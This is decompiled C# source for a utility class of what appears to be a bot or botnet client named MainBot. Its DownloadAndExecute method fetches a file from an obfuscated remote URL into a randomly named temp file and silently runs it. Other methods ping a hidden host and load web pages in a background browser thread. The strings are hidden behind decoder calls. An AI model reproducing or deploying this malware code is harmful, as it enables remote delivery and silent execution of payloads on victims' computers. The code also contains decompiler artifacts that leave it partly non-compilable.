namespace MainBot
{
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Net;
    using System.Net.NetworkInformation;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Threading;
    using System.Windows.Forms;

    internal class Util
    {
        public static Random random_0 = new Random();

        private static void BrowserCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            if ((sender as WebBrowser).Url == e.Url)
            {
                Application.ExitThread();
                SetProcessWorkingSizeM();
            }
        }

        public static bool CheckFileSums(string File1, string File2)
        {
            uint num;
            uint num2;
            uint num3;
            uint num4;
            MapFileAndCheckSum(File1, out num, out num3);
            if (MapFileAndCheckSum(File2, out num2, out num4))
            {
                return false;
            }
            return ((num2 == num) && (num4 == num3));
        }

        public static byte[] CopyObject(object object_0)
        {
            byte[] destination = new byte[0];
            if ((object_0 != null) && (object_0.GetType() == typeof(byte[])))
            {
                return (byte[]) object_0;
            }
            try
            {
                int cb = Marshal.SizeOf(object_0);
                IntPtr ptr = Marshal.AllocHGlobal(cb);
                Marshal.StructureToPtr(object_0, ptr, false);
                destination = new byte[cb];
                Marshal.Copy(ptr, destination, 0, cb);
                Marshal.FreeHGlobal(ptr);
            }
            catch
            {
            }
            return destination;
        }

        public static bool DownloadAndExecute(string URL)
        {
            try
            {
                if (!URL.StartsWith(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_7()))
                {
                    URL = <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_7() + URL;
                }
                WebClient client2 = new WebClient();
                client2.Proxy = null;
                WebClient client = client2;
                Process process = new Process();
                string str = URL.Substring(URL.LastIndexOf('.')).ToLower();
                string fileName = Environment.GetEnvironmentVariable(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_8()) + <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_9() + RandomString(random_0.Next(5, 12)) + str;
                client.DownloadFile(URL, fileName);
                if (System.IO.File.Exists(fileName) && !CheckFileSums(Configuration.CurrentFilename, fileName))
                {
                    process.StartInfo.FileName = fileName;
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.ErrorDialog = false;
                    process.Start();
                }
                else
                {
                    return false;
                }
            }
            catch
            {
                return false;
            }
            return true;
        }

        public static string GetUserAgent()
        {
            IntPtr ptr = Marshal.AllocHGlobal(0xff);
            uint num = 0xff;
            ObtainUserAgentString(0, ptr, ref num);
            return Marshal.PtrToStringAnsi(ptr);
        }

        [DllImport("imagehlp", CharSet=CharSet.Unicode)]
        private static extern bool MapFileAndCheckSum(string string_0, out uint uint_0, out uint uint_1);
        [DllImport("urlmon", CharSet=CharSet.Ansi)]
        private static extern bool ObtainUserAgentString(uint uint_0, IntPtr intptr_0, ref uint uint_1);
        public static uint Ping()
        {
            PingOptions options = new PingOptions();
            options.DontFragment = true;
            PingReply reply = new System.Net.NetworkInformation.Ping().Send(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_10(), 0x3e8, new byte[0x10], options);
            if (reply.Status == IPStatus.Success)
            {
                return (uint) reply.RoundtripTime;
            }
            return 0x3e7;
        }

        public static string RandomString(int Length)
        {
            string str = <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_6();
            StringBuilder builder = new StringBuilder();
            for (int i = 0; i < Length; i++)
            {
                builder.Append(str.Substring(random_0.Next(0, str.Length), 1));
            }
            return builder.ToString();
        }

        [DllImport("kernel32", CharSet=CharSet.Unicode)]
        private static extern int SetProcessWorkingSetSize(IntPtr intptr_0, int int_0, int int_1);
        public static void SetProcessWorkingSizeM()
        {
            GC.Collect();
            GC.WaitForPendingFinalizers();
            if (Environment.OSVersion.Platform == PlatformID.Win32NT)
            {
                SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1);
            }
        }

        public static void smethod_4(string string_0)
        {
            ThreadStart start = null;
            if (!string_0.StartsWith(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_7()))
            {
                string_0 = <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_7() + string_0;
            }
            try
            {
                if (start == null)
                {
                    <>c__DisplayClass2 class2;
                    start = new ThreadStart(class2.<VisitPage>b__0);
                }
                Thread thread = new Thread(start);
                thread.SetApartmentState(ApartmentState.STA);
                thread.Start();
            }
            catch
            {
            }
        }
    }
}

